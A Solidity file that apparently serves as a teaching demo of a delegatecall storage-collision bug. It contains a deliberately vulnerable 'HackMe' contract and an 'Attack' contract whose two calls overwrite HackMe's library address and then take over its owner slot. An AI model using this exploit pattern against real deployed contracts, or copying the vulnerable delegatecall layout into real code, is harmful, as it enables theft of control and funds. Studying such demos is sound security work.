// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Lib {
    uint public aNumber;
    function doSomething(uint _number) public {
        aNumber = _number;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint aNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        (bool res, ) = lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
        require(res, "delegatecall failed");
    }
}

contract Attack {
    address public lib;
    address public owner;
    uint public aNumber;

    HackMe public hackme;

    constructor(address _hackme) {
        hackme = HackMe(_hackme);
    }

    function attack() public {
        hackme.doSomething(uint(uint160(address(this))));
        hackme.doSomething(0);

    }

    function doSomething(uint _int) public {
        owner = msg.sender;
    }

}